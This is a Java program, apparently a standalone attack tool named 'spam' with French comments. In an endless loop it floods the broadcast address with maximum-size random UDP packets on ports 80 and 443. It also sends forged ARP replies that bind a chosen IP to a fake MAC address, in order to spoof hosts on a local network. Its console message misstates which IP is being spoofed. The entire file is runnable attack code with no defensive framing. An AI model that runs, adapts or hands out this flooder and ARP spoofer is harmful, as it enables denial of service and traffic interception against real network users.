import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;
import java.util.Random;

import org.pcap4j.core.PcapHandle;
import org.pcap4j.core.PcapNetworkInterface;
import org.pcap4j.core.Pcaps;
import org.pcap4j.packet.ArpPacket;
import org.pcap4j.packet.Packet;
import org.pcap4j.packet.namednumber.ArpHardwareType;
import org.pcap4j.packet.namednumber.ArpOperation;
import org.pcap4j.packet.namednumber.EtherType;
import org.pcap4j.util.MacAddress;

public class spam {
    public static void main(String[] args) {
        try {
            // Étape 1 : Configuration pour le socket UDP
            DatagramSocket socket = new DatagramSocket();
            socket.setBroadcast(true); // Activer la diffusion

            InetAddress address = InetAddress.getByName("255.255.255.255");
            byte[] buffer = new byte[65507]; // Taille maximale d'un paquet UDP

            int[] ports = {80, 443}; // Ports définis

            String[] colorStrings = {"\u001B[31m", "\u001B[32m", "\u001B[33m", "\u001B[34m", "\u001B[35m", "\u001B[36m"};
            String ANSI_RESET = "\u001B[0m";

            Random random = new Random();

            // Étape 2 : Configuration ARP spoofing
            String gatewayIp = "172.29.255.254"; // IP de la passerelle (à remplacer si besoin)
            String spoofedIp = "172.29.41.9"; // IP à usurper
            MacAddress spoofedMac = MacAddress.getByName("00:11:22:33:44:55"); // Adresse MAC usurpée

            // Étape 3 : Identifier l'interface réseau
            PcapNetworkInterface nif = Pcaps.getDevByName("eth0"); // Remplacez "eth0" par votre interface réseau
            if (nif == null) {
                System.out.println("Interface réseau introuvable.");
                return;
            }

            // Étape 4 : Ouvrir un handle sur l'interface réseau
            PcapHandle handle = nif.openLive(
                65536, // Taille du buffer (en octets)
                PcapNetworkInterface.PromiscuousMode.PROMISCUOUS, // Mode promiscuité
                100 // Timeout en millisecondes
            );

            InetAddress targetIp = InetAddress.getByName(gatewayIp);
            MacAddress targetMac = MacAddress.getByName("ff:ff:ff:ff:ff:ff"); // Adresse MAC de diffusion

            // Construction du paquet ARP
            ArpPacket.Builder arpBuilder = new ArpPacket.Builder();
            arpBuilder.hardwareType(ArpHardwareType.ETHERNET)
                      .protocolType(EtherType.IPV4)
                      .hardwareAddrLength((byte) MacAddress.SIZE_IN_BYTES)
                      .protocolAddrLength((byte) 4)
                      .operation(ArpOperation.REPLY)
                      .srcHardwareAddr(spoofedMac)
                      .srcProtocolAddr(InetAddress.getByName(spoofedIp))
                      .dstHardwareAddr(targetMac)
                      .dstProtocolAddr(targetIp);

            Packet arpPacket = arpBuilder.build();

            // Étape 5 : Boucle principale
            while (true) {
                // Remplir le buffer avec des données aléatoires hexadécimales
                for (int i = 0; i < buffer.length; i++) {
                    buffer[i] = (byte) (random.nextInt(16) + '0');
                    if (buffer[i] > '9') {
                        buffer[i] += ('A' - '9' - 1);
                    }
                }

                // Envoyer des paquets UDP
                for (int port : ports) {
                    DatagramPacket packet = new DatagramPacket(buffer, buffer.length, address, port);
                    socket.send(packet);
                    System.out.println("Packet envoyé sur le port : " + colorStrings[random.nextInt(colorStrings.length)] + port + ANSI_RESET);
                }

                // Envoyer le paquet ARP
                handle.sendPacket(arpPacket);
                System.out.println("Paquet ARP envoyé pour usurper l'IP de la passerelle : " + gatewayIp);

                // Pause
                Thread.sleep(1000); // Ajustez le temps de pause si nécessaire
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
